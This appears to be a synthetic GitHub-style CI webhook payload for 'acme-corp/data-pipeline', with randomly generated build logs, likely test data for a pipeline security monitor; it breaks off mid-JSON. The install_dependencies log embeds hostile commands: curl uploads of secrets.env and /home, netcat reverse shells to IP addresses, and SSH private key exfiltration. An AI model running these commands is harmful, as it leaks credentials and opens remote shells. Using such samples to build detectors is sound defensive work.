{
  "action": "completed",
  "workflow_run": {
    "id": 532,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "d987fb43b7f71d1f4111b4b2e9efc4f5e2d9d42b",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-06T12:00:28.317557Z",
    "updated_at": "2025-12-06T12:04:37.243499Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: integration_tests ===\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (12MB)\nInstalling eslint@1.17.0\nStep 6/10: Building\nStep 2/10: Building\n\u2713 build completed\nInstalling react@3.1.0\nArtifact uploaded: build.tar.gz (17MB)\nArtifact uploaded: build.tar.gz (43MB)\nStep 4/10: Building\n  PASS: test_user_create (244ms)\nInstalling react@5.8.0\nStep 3/10: Building\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (20MB)\nStep 4/10: Building\nCache hit for key-6924\n  PASS: test_db_connect (257ms)\nInstalling eslint@5.9.0\n\u2713 build completed\nCompiling src/app.ts...\n[12:00:28] INFO: Processing request\nCache hit for key-8139\n[12:00:28] INFO: Processing request\nCache hit for key-3349\n\u2713 test completed\n\u2713 test completed\nStep 5/10: Building\nStep 2/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (45MB)\nException: RuntimeError\nStep 3/10: Building\n  PASS: test_api_health (147ms)\nCache hit for key-5111\n[12:00:28] INFO: Processing request\nStep 7/10: Building\n\u2713 build completed\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 test completed\nCompiling src/index.js...\nCache hit for key-2238\nInstalling react@4.8.0\n  PASS: test_cache_hit (148ms)\n\u2713 lint completed\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:28] INFO: Processing request\nCompiling src/utils.go...\nStep 6/10: Building\n[12:00:28] WARN: Deprecated API usage\n\u2713 test completed\n  PASS: test_db_connect (325ms)\n=== Step integration_tests completed ===\n=== Step: build ===\nCache hit for key-9253\n[12:00:28] INFO: Processing request\nFAILED: test_api_health\nCache hit for key-8756\n  PASS: test_auth_login (155ms)\n  PASS: test_db_connect (436ms)\nCache hit for key-4268\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-4612\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-2426\n  PASS: test_cache_hit (444ms)\n\u2713 test completed\nCache hit for key-6610\n  PASS: test_db_connect (48ms)\nInstalling express@2.0.0\nCompiling src/app.ts...\n  PASS: test_auth_login (192ms)\n[12:00:28] INFO: Processing request\nCache hit for key-4219\nInstalling jest@1.5.0\nArtifact uploaded: build.tar.gz (31MB)\nWARNING: prettier has known vulnerabilities\nCompiling src/app.ts...\n[12:00:28] WARN: Deprecated API usage\nInstalling prettier@1.4.0\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 3/10: Building\n[12:00:28] WARN: Deprecated API usage\n[12:00:28] INFO: Processing request\nStep 9/10: Building\n  PASS: test_api_health (494ms)\nCache hit for key-8006\nInstalling axios@1.13.0\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-4823\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nStep 6/10: Building\nCompiling src/app.ts...\nCache hit for key-8697\nCache hit for key-6466\nCache hit for key-7860\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/main.py...\n  PASS: test_api_health (56ms)\nInstalling eslint@3.3.0\nStep 10/10: Building\n[12:00:28] INFO: Processing request\n  PASS: test_auth_login (28ms)\nArtifact uploaded: build.tar.gz (30MB)\n=== Step build completed ===\n=== Step: unit_tests ===\n[12:00:28] INFO: Processing request\n[12:00:28] ERROR: Connection failed\n[12:00:28] INFO: Processing request\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\n[12:00:28] ERROR: Connection failed\nInstalling jest@3.7.0\n\u2713 lint completed\nInstalling express@3.15.0\nStep 6/10: Building\nCache hit for key-4849\nInstalling lodash@1.19.0\nCompiling src/main.py...\n  PASS: test_api_health (320ms)\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 test completed\nInstalling react@5.19.0\nInstalling jest@3.2.0\nInstalling axios@3.1.0\n[12:00:28] INFO: Processing request\nStep 7/10: Building\n  PASS: test_user_create (401ms)\nCache hit for key-9601\nWARNING: eslint has known vulnerabilities\nWARNING: axios has known vulnerabilities\nException: ValueError\n\u2713 test completed\n  PASS: test_cache_hit (248ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 test completed\nStep 1/10: Building\n\u2713 lint completed\n  PASS: test_db_connect (110ms)\nInstalling express@5.6.0\n[12:00:28] INFO: Processing request\nStep 7/10: Building\n  PASS: test_auth_login (274ms)\nStep 9/10: Building\n[12:00:28] INFO: Processing request\n[12:00:28] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:28] WARN: Deprecated API usage\nCompiling src/main.py...\nCompiling src/service.java...\nFAILED: test_auth_login\nInstalling webpack@2.1.0\n[12:00:28] WARN: Deprecated API usage\nStep 7/10: Building\nStep 8/10: Building\n[12:00:28] INFO: Processing request\n  PASS: test_auth_login (59ms)\n\u2713 test completed\n  PASS: test_auth_login (493ms)\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\n\u2713 lint completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (37MB)\nInstalling prettier@4.10.0\nCompiling src/handler.rs...\nWARNING: react has known vulnerabilities\nInstalling express@3.4.0\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/service.java...\n\u2713 build completed\n  PASS: test_user_create (188ms)\nCompiling src/index.js...\nCache hit for key-6748\n\u2713 test completed\nCache hit for key-8677\nCompiling src/handler.rs...\n[12:00:28] INFO: Processing request\n[12:00:28] ERROR: Connection failed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-4306\nCompiling src/app.ts...\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 build completed\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_auth_login (473ms)\n  PASS: test_auth_login (151ms)\nStep 4/10: Building\nStep 10/10: Building\n[12:00:28] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:28] INFO: Processing request\nCompiling src/service.java...\n\u2713 test completed\n  PASS: test_cache_hit (464ms)\nInstalling express@1.2.0\nStep 9/10: Building\nStep 6/10: Building\n  PASS: test_api_health (320ms)\n[12:00:28] INFO: Processing request\nInstalling lodash@3.15.0\nCache hit for key-8506\nStep 5/10: Building\nCache hit for key-5735\nCompiling src/main.py...\n\u2713 test completed\n[12:00:28] WARN: Deprecated API usage\nCompiling src/app.ts...\n  PASS: test_user_create (463ms)\n\u2713 lint completed\nInstalling webpack@2.6.0\nCompiling src/index.js...\n=== Step restore_cache completed ===\n=== Step: deploy_staging ===\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/utils.go...\n  PASS: test_api_health (479ms)\n\u2713 lint completed\nInstalling axios@1.5.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 2/10: Building\n\u2713 build completed\nStep 9/10: Building\nWARNING: jest has known vulnerabilities\nCompiling src/utils.go...\n[12:00:28] INFO: Processing request\nCache hit for key-1706\n  PASS: test_auth_login (488ms)\nCache hit for key-3352\nCache hit for key-1649\n[12:00:28] WARN: Deprecated API usage\nCache hit for key-3147\n[12:00:28] INFO: Processing request\n  PASS: test_cache_hit (288ms)\n  PASS: test_user_create (54ms)\nWARNING: jest has known vulnerabilities\nCache hit for key-7705\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\n[12:00:28] WARN: Deprecated API usage\nStep 8/10: Building\n  PASS: test_db_connect (364ms)\nCache hit for key-8147\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/main.py...\n  PASS: test_auth_login (259ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\nInstalling jest@5.8.0\n  PASS: test_auth_login (452ms)\n  PASS: test_cache_hit (205ms)\nCache hit for key-7850\nStep 5/10: Building\nCache hit for key-1644\nInstalling prettier@2.16.0\nCache hit for key-9132\nInstalling react@2.20.0\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-6431\nCompiling src/index.js...\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:28] INFO: Processing request\nStep 8/10: Building\n  PASS: test_auth_login (37ms)\n  PASS: test_auth_login (256ms)\nArtifact uploaded: build.tar.gz (7MB)\n=== Step deploy_staging completed ===\n=== Step: upload_artifacts ===\nArtifact uploaded: build.tar.gz (13MB)\nStep 1/10: Building\nCache hit for key-8074\nCompiling src/handler.rs...\nCache hit for key-9889\nStep 3/10: Building\nStep 10/10: Building\nCache hit for key-5338\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:28] WARN: Deprecated API usage\n  PASS: test_cache_hit (445ms)\n  PASS: test_cache_hit (130ms)\nCache hit for key-6988\n  PASS: test_user_create (201ms)\nCache hit for key-8583\nInstalling prettier@3.1.0\n  PASS: test_cache_hit (456ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nStep 9/10: Building\nStep 2/10: Building\nStep 2/10: Building\n[12:00:28] INFO: Processing request\nCompiling src/main.py...\nCompiling src/handler.rs...\nInstalling jest@5.9.0\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-7016\nStep 1/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 test completed\nCompiling src/utils.go...\n  PASS: test_user_create (273ms)\nWARNING: axios has known vulnerabilities\nCache hit for key-5726\n\u2713 test completed\nCompiling src/app.ts...\nCompiling src/main.py...\nCompiling src/index.js...\nCache hit for key-4889\nCompiling src/app.ts...\n\u2713 test completed\n\u2713 lint completed\nCache hit for key-5281\nCompiling src/index.js...\nStep 8/10: Building\nWARNING: axios has known vulnerabilities\nInstalling react@2.7.0\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 test completed\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nInstalling eslint@2.10.0\nStep 7/10: Building\nCompiling src/service.java...\nInstalling eslint@2.9.0\n[12:00:28] INFO: Processing request\nInstalling lodash@4.12.0\nCompiling src/utils.go...\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\n\u2713 build completed\nStep 6/10: Building\n[12:00:28] INFO: Processing request\n\u2713 lint completed\n[12:00:28] INFO: Processing request\nStep 6/10: Building\nCache hit for key-2728\n\u2713 test completed\n  PASS: test_cache_hit (399ms)\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\nStep 7/10: Building\n\u2713 test completed\n\u2713 test completed\nInstalling lodash@3.13.0\n\u2713 test completed\nCache hit for key-3984\nStep 9/10: Building\nCache hit for key-3136\n[12:00:28] INFO: Processing request\nCompiling src/utils.go...\nInstalling jest@1.12.0\nCompiling src/app.ts...\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\nInstalling axios@2.17.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 3/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/index.js...\nCache hit for key-4070\n\u2713 lint completed\nStep 9/10: Building\nInstalling prettier@1.8.0\nStep 3/10: Building\nCompiling src/index.js...\nInstalling prettier@5.17.0\nStep 6/10: Building\nCompiling src/index.js...\nInstalling react@2.6.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-2375\nInstalling react@3.7.0\n[12:00:28] WARN: Deprecated API usage\nCompiling src/index.js...\n=== Step save_cache completed ===\n=== Step: checkout ===\n[12:00:28] WARN: Deprecated API usage\n[12:00:28] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (30MB)\nArtifact uploaded: build.tar.gz (39MB)\nStep 5/10: Building\n\u2713 build completed\nStep 9/10: Building\n  PASS: test_db_connect (315ms)\nCache hit for key-7547\nStep 2/10: Building\nStep 4/10: Building\nInstalling jest@2.6.0\nStep 5/10: Building\n  PASS: test_db_connect (204ms)\nStep 6/10: Building\nInstalling express@2.3.0\n[12:00:28] WARN: Deprecated API usage\nCache hit for key-1618\nInstalling jest@4.12.0\n  PASS: test_api_health (277ms)\nStep 8/10: Building\nCompiling src/service.java...\n\u2713 build completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\nInstalling prettier@1.12.0\nCompiling src/service.java...\nStep 9/10: Building\n\u2713 lint completed\nCompiling src/index.js...\n[12:00:28] INFO: Processing request\n  PASS: test_db_connect (453ms)\nCache hit for key-2976\nInstalling lodash@2.11.0\n\u2713 build completed\nInstalling express@4.9.0\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\n  PASS: test_user_create (270ms)\nCache hit for key-3518\nStep 8/10: Building\nStep 6/10: Building\nCompiling src/utils.go...\nCache hit for key-5707\n\u2713 lint completed\nStep 2/10: Building\n  PASS: test_cache_hit (388ms)\n[12:00:28] INFO: Processing request\nCache hit for key-3001\nStep 9/10: Building\n=== Step checkout completed ===\n=== Step: type_check ===\nArtifact uploaded: build.tar.gz (15MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: react has known vulnerabilities\nInstalling prettier@5.0.0\n[12:00:28] WARN: Deprecated API usage\nCache hit for key-3787\nCompiling src/handler.rs...\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@2.0.0\nCache hit for key-5930\n[12:00:28] WARN: Deprecated API usage\nStep 4/10: Building\nCache hit for key-8227\n[12:00:28] WARN: Deprecated API usage\nCache hit for key-6444\n\u2713 build completed\n[12:00:28] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (4MB)\nInstalling react@2.6.0\nArtifact uploaded: build.tar.gz (37MB)\nInstalling axios@4.20.0\nStep 4/10: Building\nInstalling express@5.10.0\nCache hit for key-1270\n\u2713 lint completed\n[12:00:28] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_user_create (488ms)\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/app.ts...\n  PASS: test_api_health (218ms)\nCompiling src/utils.go...\n[12:00:28] INFO: Processing request\n[12:00:28] INFO: Processing request\nStep 8/10: Building\n\u2713 test completed\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\nInstalling eslint@4.14.0\nInstalling express@5.6.0\n\u2713 lint completed\nCache hit for key-5377\n\u2713 lint completed\nCompiling src/utils.go...\n[12:00:28] INFO: Processing request\nCache hit for key-4737\nCache hit for key-5546\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (37MB)\n=== Step type_check completed ===\n=== Step: install_dependencies ===\n[12:00:28] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@3.10.0\nCache hit for key-4655\nInstalling eslint@3.2.0\nInstalling webpack@5.17.0\nCache hit for key-9552\n\u2713 build completed\nSending 13MB of data to example.com\ncurl -X POST https://test.io/collect -d @secrets.env\nSending 282MB of data to example.com\n[12:00:28] INFO: Processing request\n\u2713 lint completed\n[12:00:28] WARN: Deprecated API usage\nSending 126MB of data to startup.dev\nStep 3/10: Building\nCompiling src/handler.rs...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (18MB)\nSending 399MB of data to cloud.services\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n\u2713 build completed\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (4MB)\nnc -e /bin/sh 87.124.199.175 33123\nInstalling lodash@2.11.0\nInstalling express@2.14.0\ncurl -X POST https://startup.dev/collect -d @secrets.env\n\u2713 build completed\nSending 328MB of data to example.com\n[12:00:28] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_cache_hit (182ms)\nnc -e /bin/sh 45.84.224.50 17941\nCache hit for key-9943\nInstalling axios@4.20.0\nStep 7/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 199.27.132.129 10988\n  PASS: test_api_health (306ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-9409\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nFAILED: test_cache_hit\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_auth_login (444ms)\n\u2713 test completed\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nWARNING: react has known vulnerabilities\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\nCompiling src/handler.rs...\n  PASS: test_api_health (156ms)\nInstalling prettier@3.9.0\nStep 2/10: Building\nStep 7/10: Building\nStep 2/10: Building\n[12:00:28] INFO: Processing request\nInstalling express@1.4.0\nInstalling prettier@2.18.0\nCompiling src/utils.go...\nInstalling jest@2.6.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 48.222.165.51 7660\n  PASS: test_cache_hit (418ms)\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (2MB)\nnc -e /bin/sh 223.148.13.136 19300\nCache hit for key-7066\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-06T12:00:28.317557",
        "finished_at": "2025-12-06T12:01:00.231139",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing eslint@1.17.0",
          "Step 6/10: Building",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Installing react@3.1.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 4/10: Building",
          "  PASS: test_user_create (244ms)",
          "Installing react@5.8.0",
          "Step 3/10: Building",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 4/10: Building",
          "Cache hit for key-6924",
          "  PASS: test_db_connect (257ms)",
          "Installing eslint@5.9.0",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "[12:00:28] INFO: Processing request",
          "Cache hit for key-8139",
          "[12:00:28] INFO: Processing request",
          "Cache hit for key-3349",
          "\u2713 test completed",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Exception: RuntimeError",
          "Step 3/10: Building",
          "  PASS: test_api_health (147ms)",
          "Cache hit for key-5111",
          "[12:00:28] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 build completed",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-2238",
          "Installing react@4.8.0",
          "  PASS: test_cache_hit (148ms)",
          "\u2713 lint completed",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:28] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "[12:00:28] WARN: Deprecated API usage",
          "\u2713 test completed",
          "  PASS: test_db_connect (325ms)",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-06T12:01:00.231139",
        "finished_at": "2025-12-06T12:01:48.101512",
        "log_lines": [
          "=== Step: build ===",
          "Cache hit for key-9253",
          "[12:00:28] INFO: Processing request",
          "FAILED: test_api_health",
          "Cache hit for key-8756",
          "  PASS: test_auth_login (155ms)",
          "  PASS: test_db_connect (436ms)",
          "Cache hit for key-4268",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-4612",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-2426",
          "  PASS: test_cache_hit (444ms)",
          "\u2713 test completed",
          "Cache hit for key-6610",
          "  PASS: test_db_connect (48ms)",
          "Installing express@2.0.0",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (192ms)",
          "[12:00:28] INFO: Processing request",
          "Cache hit for key-4219",
          "Installing jest@1.5.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/app.ts...",
          "[12:00:28] WARN: Deprecated API usage",
          "Installing prettier@1.4.0",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 3/10: Building",
          "[12:00:28] WARN: Deprecated API usage",
          "[12:00:28] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_api_health (494ms)",
          "Cache hit for key-8006",
          "Installing axios@1.13.0",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-4823",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-8697",
          "Cache hit for key-6466",
          "Cache hit for key-7860",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/main.py...",
          "  PASS: test_api_health (56ms)",
          "Installing eslint@3.3.0",
          "Step 10/10: Building",
          "[12:00:28] INFO: Processing request",
          "  PASS: test_auth_login (28ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-06T12:01:48.101512",
        "finished_at": "2025-12-06T12:02:35.971885",
        "log_lines": [
          "=== Step: unit_tests ===",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] ERROR: Connection failed",
          "[12:00:28] INFO: Processing request",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:28] ERROR: Connection failed",
          "Installing jest@3.7.0",
          "\u2713 lint completed",
          "Installing express@3.15.0",
          "Step 6/10: Building",
          "Cache hit for key-4849",
          "Installing lodash@1.19.0",
          "Compiling src/main.py...",
          "  PASS: test_api_health (320ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 test completed",
          "Installing react@5.19.0",
          "Installing jest@3.2.0",
          "Installing axios@3.1.0",
          "[12:00:28] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_user_create (401ms)",
          "Cache hit for key-9601",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Exception: ValueError",
          "\u2713 test completed",
          "  PASS: test_cache_hit (248ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "  PASS: test_db_connect (110ms)",
          "Installing express@5.6.0",
          "[12:00:28] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_auth_login (274ms)",
          "Step 9/10: Building",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:28] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "FAILED: test_auth_login",
          "Installing webpack@2.1.0",
          "[12:00:28] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "[12:00:28] INFO: Processing request",
          "  PASS: test_auth_login (59ms)",
          "\u2713 test completed",
          "  PASS: test_auth_login (493ms)",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-06T12:02:35.971885",
        "finished_at": "2025-12-06T12:02:45.545960",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing prettier@4.10.0",
          "Compiling src/handler.rs...",
          "WARNING: react has known vulnerabilities",
          "Installing express@3.4.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "  PASS: test_user_create (188ms)",
          "Compiling src/index.js...",
          "Cache hit for key-6748",
          "\u2713 test completed",
          "Cache hit for key-8677",
          "Compiling src/handler.rs...",
          "[12:00:28] INFO: Processing request",
          "[12:00:28] ERROR: Connection failed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-4306",
          "Compiling src/app.ts...",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 build completed",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_auth_login (473ms)",
          "  PASS: test_auth_login (151ms)",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "[12:00:28] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:28] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "  PASS: test_cache_hit (464ms)",
          "Installing express@1.2.0",
          "Step 9/10: Building",
          "Step 6/10: Building",
          "  PASS: test_api_health (320ms)",
          "[12:00:28] INFO: Processing request",
          "Installing lodash@3.15.0",
          "Cache hit for key-8506",
          "Step 5/10: Building",
          "Cache hit for key-5735",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "[12:00:28] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (463ms)",
          "\u2713 lint completed",
          "Installing webpack@2.6.0",
          "Compiling src/index.js...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-06T12:02:45.545960",
        "finished_at": "2025-12-06T12:03:01.502751",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (479ms)",
          "\u2713 lint completed",
          "Installing axios@1.5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Step 9/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/utils.go...",
          "[12:00:28] INFO: Processing request",
          "Cache hit for key-1706",
          "  PASS: test_auth_login (488ms)",
          "Cache hit for key-3352",
          "Cache hit for key-1649",
          "[12:00:28] WARN: Deprecated API usage",
          "Cache hit for key-3147",
          "[12:00:28] INFO: Processing request",
          "  PASS: test_cache_hit (288ms)",
          "  PASS: test_user_create (54ms)",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-7705",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "[12:00:28] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "  PASS: test_db_connect (364ms)",
          "Cache hit for key-8147",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (259ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "Installing jest@5.8.0",
          "  PASS: test_auth_login (452ms)",
          "  PASS: test_cache_hit (205ms)",
          "Cache hit for key-7850",
          "Step 5/10: Building",
          "Cache hit for key-1644",
          "Installing prettier@2.16.0",
          "Cache hit for key-9132",
          "Installing react@2.20.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-6431",
          "Compiling src/index.js...",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:28] INFO: Processing request",
          "Step 8/10: Building",
          "  PASS: test_auth_login (37ms)",
          "  PASS: test_auth_login (256ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-06T12:03:01.502751",
        "finished_at": "2025-12-06T12:03:17.459542",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 1/10: Building",
          "Cache hit for key-8074",
          "Compiling src/handler.rs...",
          "Cache hit for key-9889",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-5338",
          "[12:00:28] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:28] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (445ms)",
          "  PASS: test_cache_hit (130ms)",
          "Cache hit for key-6988",
          "  PASS: test_user_create (201ms)",
          "Cache hit for key-8583",
          "Installing prettier@3.1.0",
          "  PASS: test_cache_hit (456ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Step 2/10: Building",
          "Step 2/10: Building",
